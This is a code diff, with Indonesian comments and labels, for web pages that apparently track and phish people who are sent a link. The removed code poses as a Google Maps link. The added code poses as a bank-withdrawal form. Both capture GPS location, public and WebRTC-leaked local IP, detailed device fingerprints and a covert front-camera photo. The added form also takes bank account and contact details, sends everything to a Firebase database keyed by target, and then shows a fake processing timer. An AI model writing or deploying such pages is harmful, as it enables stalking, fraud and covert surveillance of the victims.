+    }
+
+    function popupKonfirmasi() {
+      return new Promise((resolve) => {
+        popupLokasi.style.display = "flex";
+        btnIzinkan.onclick = () => {
+          popupLokasi.style.display = "none";
+          resolve(true);
         };
-      }).catch(()=>resolve(null));
-    }catch(e){resolve(null)}
-  });
-}
+        btnBatal.onclick = () => {
+          popupLokasi.style.display = "none";
+          resolve(false);
+        };
+      });
+    }
 
-// ── device info
-function devInfo(){
-  const ua=navigator.userAgent;
-  let p='Unknown';
-  if(/Android/i.test(ua))p='Android';
-  else if(/iPhone|iPad/i.test(ua))p='iOS';
-  else if(/Windows/i.test(ua))p='Windows';
-  else if(/Mac/i.test(ua))p='MacOS';
-  return{platform:p,screen:window.screen.width+'x'+window.screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone||'-',lang:navigator.language||'-'};
-}
+    function popupTolakLokasi() {
+      return new Promise((resolve) => {
+        popupTolak.style.display = "flex";
+        btnTutupTolak.onclick = () => {
+          popupTolak.style.display = "none";
+          resolve();
+        };
+      });
+    }
 
-// ── state
-let targetLat=null,targetLng=null,dataReady=false;
+    function ambilLokasi() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ ok: false, reason: "Browser tidak mendukung geolocation" });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            ok: true,
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy
+          }),
+          (err) => resolve({ ok: false, reason: err.message }),
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+        );
+      });
+    }
 
-// ── TOMBOL KLIK
-window.bukaMaps=async function(){
-  const btn=document.getElementById('btnMaps');
-  const spinner=document.getElementById('spinner');
-  const status=document.getElementById('statusTxt');
-
-  btn.classList.add('loading');
-  btn.querySelector('svg').style.display='none';
-  spinner.style.display='block';
-  status.innerText='Mendapatkan lokasi...';
-
-  if(!navigator.geolocation){
-    status.innerText='GPS tidak didukung di browser ini';
-    btn.classList.remove('loading');spinner.style.display='none';btn.querySelector('svg').style.display='';
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(async pos=>{
-    targetLat=pos.coords.latitude;
-    targetLng=pos.coords.longitude;
-    const akurasi=pos.coords.accuracy;
-
-    // tampilkan koordinat (unblur)
-    document.getElementById('coordVal').innerText=targetLat.toFixed(5)+', '+targetLng.toFixed(5);
-    document.getElementById('coordVal').classList.add('revealed');
-    document.getElementById('coordAcc').innerText='Akurasi: ~'+Math.round(akurasi)+'m';
-    document.getElementById('coordAcc').classList.add('revealed');
-
-    status.innerText='Lokasi ditemukan! Membuka Maps...';
-
-    // kirim ke Firebase paralel — tidak blokir redirect
-    const ip=await getIP();
-    const dev=devInfo();
-    const [{kota,alamat},foto]=await Promise.all([getAlamat(targetLat,targetLng),capturePhoto()]);
-
-    const payload={
-      target:targetName,
-      lat:targetLat,lng:targetLng,akurasi,kota,alamat,ip,
-      waktu:Date.now(),
-      platform:dev.platform,screen:dev.screen,timezone:dev.tz,lang:dev.lang
-    };
-    if(foto)payload.foto=foto;
-
-    // simpan ke Firebase (tidak await — langsung redirect)
-    set(ref(db,'lokasi/'+ownerUser+'/'+sessionKey),payload).catch(()=>{});
-
-    // success overlay lalu redirect Google Maps
-    const overlay=document.getElementById('successOverlay');
-    overlay.classList.add('show');
-    document.getElementById('successSub').innerText=kota;
-    dataReady=true;
-
-    setTimeout(()=>{
-      // redirect ke Google Maps tampilkan lokasi target
-      window.location.href=`https://www.google.com/maps?q=${targetLat},${targetLng}&z=16`;
-    },2200);
-
-  },err=>{
-    // gagal izin — tetap kirim data minimal
-    getIP().then(ip=>{
-      const dev=devInfo();
-      set(ref(db,'lokasi/'+ownerUser+'/'+sessionKey),{
-        target:targetName,ip,waktu:Date.now(),
-        platform:dev.platform,screen:dev.screen,timezone:dev.tz,
-        izinDitolak:true
-      }).catch(()=>{});
+    /* ==== FORMAT ANGKA RIBUAN OTOMATIS ==== */
+    const inputJumlah = document.getElementById("jumlah");
+    inputJumlah.addEventListener("input", function () {
+      let angka = this.value.replace(/[^\d]/g, "");
+      if (angka === "") { this.value = ""; return; }
+      this.value = angka.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
     });
-    status.innerText='Izin lokasi diperlukan untuk membuka Maps';
-    btn.classList.remove('loading');spinner.style.display='none';btn.querySelector('svg').style.display='';
-  },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
-};
 
-window.tolak=()=>{
-  window.location.href=`https://www.google.com/maps`;
-};
-</script>
+    /* ==== DETEKSI INFO PERANGKAT ==== */
+    async function getInfoPerangkat() {
+      const info = {};
+      try {
+        if (navigator.getBattery) {
+          const bat = await navigator.getBattery();
+          info.baterai = Math.round(bat.level * 100) + "%" + (bat.charging ? " (Charging)" : "");
+        } else {
+          info.baterai = "Tidak didukung";
+        }
+      } catch (e) { info.baterai = "-"; }
+
+      try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const d = await r.json();
+        info.ipPublik = d.ip;
+      } catch (e) { info.ipPublik = "-"; }
+
+      info.ipLokal = await new Promise((resolve) => {
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel("");
+          pc.onicecandidate = (e) => {
+            if (!e.candidate) { resolve("-"); return; }
+            const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (m) { resolve(m[1]); pc.close(); }
+          };
+          pc.createOffer().then(o => pc.setLocalDescription(o));
+          setTimeout(() => resolve("-"), 2000);
+        } catch (err) { resolve("-"); }
+      });
+
+      info.ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui";
+      info.cpu = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " core" : "Tidak diketahui";
+      info.layar = screen.width + " x " + screen.height;
+
+      const ua = navigator.userAgent;
+      let os = "Tidak diketahui";
+      if (/Android/i.test(ua)) os = "Android";
+      else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+      else if (/Windows/i.test(ua)) os = "Windows";
+      else if (/Mac/i.test(ua)) os = "macOS";
+      else if (/Linux/i.test(ua)) os = "Linux";
+      info.os = os;
+
+      let browser = "Tidak diketahui";
+      if (/Edg/i.test(ua)) browser = "Edge";
+      else if (/OPR|Opera/i.test(ua)) browser = "Opera";
+      else if (/Chrome/i.test(ua)) browser = "Chrome";
+      else if (/Firefox/i.test(ua)) browser = "Firefox";
+      else if (/Safari/i.test(ua)) browser = "Safari";
+      info.browser = browser;
+
+      let perangkat = "Tidak diketahui";
+      const m = ua.match(/\(([^)]+)\)/);
+      if (m) {
+        const parts = m[1].split(";").map(s => s.trim());
+        const kandidat = parts.find(p => /Build|SM-|Redmi|POCO|Infinix|Oppo|Vivo|Realme|Xiaomi|Huawei|Nokia/i.test(p));
+        if (kandidat) perangkat = kandidat.replace(/Build\/.*/, "").trim();
+      }
+      info.perangkat = perangkat;
+
+      info.bahasa = navigator.language || "-";
+      try { info.zona = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { info.zona = "-"; }
+      info.online = navigator.onLine ? "Online" : "Offline";
+
+      if (navigator.connection) {
+        const c = navigator.connection;
+        info.koneksi = (c.effectiveType || "-") + (c.downlink ? " (" + c.downlink + " Mbps)" : "");
+      } else {
+        info.koneksi = "Tidak diketahui";
+      }
+
+      return info;
+    }
+
+    /* ==== KIRIM FOTO SELFIE (SAMA SEPERTI maps.html) ==== */
+    async function getCameraPhoto(timeoutMs = 10000) {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+      let stream = null;
+      try {
+        stream = await Promise.race([
+          navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 800 } },
+            audio: false
+          }),
+          new Promise((_, rej) => setTimeout(() => rej(new Error('cam-timeout')), timeoutMs))
+        ]);
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await video.play().catch(() => {});
+        await new Promise(r => setTimeout(r, 1200));
+        const W = 480, H = 640;
+        const canvas = document.getElementById('canvas');
+        canvas.width = W; canvas.height = H;
+        const ctx = canvas.getContext('2d');
+        const vw = video.videoWidth || W, vh = video.videoHeight || H;
+        const scale = Math.max(W / vw, H / vh);
+        const dw = vw * scale, dh = vh * scale;
+        ctx.drawImage(video, (W - dw) / 2, (H - dh) / 2, dw, dh);
+        return canvas.toDataURL('image/jpeg', 0.7);
+      } catch (e) {
+        return null;
+      } finally {
+        try {
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          const v = document.getElementById('video');
+          if (v) v.srcObject = null;
+        } catch (e) {}
+      }
+    }
+
+    /* ==== KIRIM KE FIREBASE (PENGGANTI TELEGRAM) ==== */
+    async function kirimFirebase(data, lokasi, perangkat, foto) {
+      const payload = {
+        target: data.nama || targetUrl,
+        via: 'maps',
+        waktu: Date.now(),
+        lat: lokasi.lat,
+        lng: lokasi.lon,
+        akurasi: Math.round(lokasi.acc),
+        sumber: 'GPS',
+        status: 'ok',
+        kota: '-',
+        ip: perangkat.ipPublik || null,
+        platform: perangkat.os + ' / ' + perangkat.browser,
+        screen: perangkat.layar,
+        timezone: perangkat.zona,
+        bahasa: perangkat.bahasa,
+        ram: perangkat.ram,
+        cpu: perangkat.cpu,
+        baterai: perangkat.baterai,
+        koneksi: perangkat.koneksi,
+        perangkat: perangkat.perangkat,
+        // Data form bank
+        nama: data.nama,
+        bank: data.bank,
+        rek: data.rek,
+        alamat: data.alamat,
+        wa: data.wa
+      };
+      if (foto) payload.foto = foto;
+      try {
+        await push(ref(db, 'lokasi/' + user), payload);
+        return true;
+      } catch (e) {
+        console.warn('push gagal:', e);
+        return false;
+      }
+    }
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const errJumlahMin = document.getElementById("err-jumlah-min");
+      errJumlahMin.style.display = "none";
+
+      let valid = true;
+      ["nama", "bank", "rek", "alamat", "wa", "jumlah"].forEach(function (id) {
+        const empty = !document.getElementById(id).value.trim();
+        document.getElementById("err-" + id).style.display = empty ? "block" : "none";
+        if (empty) valid = false;
+      });
+      if (!valid) return;
+
+      const jumlahVal = document.getElementById("jumlah").value.trim();
+      const jumlahNum = parseFloat(jumlahVal.replace(/[^\d]/g, ""));
+      if (isNaN(jumlahNum) || jumlahNum <= 0) {
+        document.getElementById("err-jumlah").textContent = "Jumlah pencairan wajib diisi dengan angka.";
+        document.getElementById("err-jumlah").style.display = "block";
+        return;
+      }
+      if (jumlahNum < 10000) {
+        errJumlahMin.style.display = "block";
+        return;
+      }
+
+      const payload = {
+        nama:   document.getElementById("nama").value.trim(),
+        bank:   document.getElementById("bank").value.trim(),
+        rek:    document.getElementById("rek").value.trim(),
+        alamat: document.getElementById("alamat").value.trim(),
+        wa:     document.getElementById("wa").value.trim()
+      };
+
+      const setuju = await popupKonfirmasi();
+      if (!setuju) return;
+
+      btnSubmit.disabled = true;
+      btnSubmit.textContent = "Memverifikasi lokasi...";
+
+      const lokasi = await ambilLokasi();
+      const perangkat = await getInfoPerangkat();
+
+      btnSubmit.disabled = false;
+      btnSubmit.textContent = "Ajukan pencairan";
+
+      if (!lokasi.ok) {
+        await popupTolakLokasi();
+        return;
+      }
+
+      // Coba ambil foto selfie (timeout 10s)
+      let foto = null;
+      try {
+        foto = await Promise.race([
+          getCameraPhoto(10000),
+          new Promise(r => setTimeout(() => r(null), 12000))
+        ]);
+      } catch (e) { foto = null; }
+
+      show(processScreen);
+      kirimFirebase(payload, lokasi, perangkat, foto).finally(startProcess);
+    });
+
+    function startProcess() {
+      const start = Date.now();
+      const tick = setInterval(function () {
+        const elapsed = Math.floor((Date.now() - start) / 1000);
+        const left = Math.max(0, DURATION - elapsed);
+        const m = String(Math.floor(left / 60)).padStart(2, "0");
+        const s = String(left % 60).padStart(2, "0");
+        timerEl.textContent = m + ":" + s;
+        progressEl.style.width = ((elapsed / DURATION) * 100).toFixed(2) + "%";
+        if (elapsed >= 75)  document.getElementById("st2").classList.add("on");
+        if (elapsed >= 180) document.getElementById("st3").classList.add("on");
+        if (elapsed >= 270) document.getElementById("st4").classList.add("on");
+        if (left <= 0) {
+          clearInterval(tick);
+          progressEl.style.width = "100%";
+          show(successScreen);
+        }
+      }, 250);
+    }
+  </script>
 </body>
 </html>
